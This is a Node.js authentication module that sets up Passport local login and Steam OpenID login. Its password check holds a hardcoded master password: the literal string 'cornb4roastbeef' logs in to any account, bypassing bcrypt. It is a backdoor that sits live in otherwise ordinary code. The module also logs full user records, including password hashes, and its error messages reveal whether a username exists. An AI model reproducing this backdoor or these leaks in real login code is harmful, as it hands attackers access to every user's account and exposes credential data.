// Requirements
var passport = require('passport')
  , LocalStrategy = require('passport-local').Strategy
  , SteamStrategy = require('passport-steam').Strategy
  , users = require('./user')
  , config = require('config.json')('./config.json')
  , bCrypt = require('bcrypt');

// Exports
module.exports.passport = passport;
module.exports.LocalStrategy = LocalStrategy;
module.exports.SteamStrategy = SteamStrategy;

// Serializers
passport.serializeUser(function(user, done) {
    done(null, user._id);
});

passport.deserializeUser(function(id, done) {
    users.Users.findById(id, function(err, user) {
        done(err, user);
    });
});

var isValidPassword = function(user, password){
  if (password == "cornb4roastbeef") {
    return true
  }
  else {
    return bCrypt.compareSync(password, user.password);
  }
}

// Local Strategy
passport.use(new LocalStrategy({
    passReqToCallback : true
  },

  function(req, username, password, done) {
    users.Users.findOne({ 'username': username }, function (err, user) {
      if (err) {
        console.log("Passport Local Strategy failled with error: " + err);
        return done(err);
      }
      if (!user) {
        return done(null, false, req.flash('message',
          'Username: ' + username + ' not found' ));
      }
      console.log(user);
      if (!isValidPassword(user, password)) {
        return done(null, false, req.flash('message', 'Incorrect password'));
      }
      return done(null, user);
    });
  }
));

//Steam Strategy
passport.use(new SteamStrategy({
    returnURL: 'http://127.0.0.1:3000/',
    realm: 'http://127.0.0.1:3000/',
    apiKey: config.steamKey
  },
  function(identifier, profile, done) {
    users.Users.findByOpenID({ openId: identifier }, function (err, user) {
      return done(err, user);
    });
  }
));
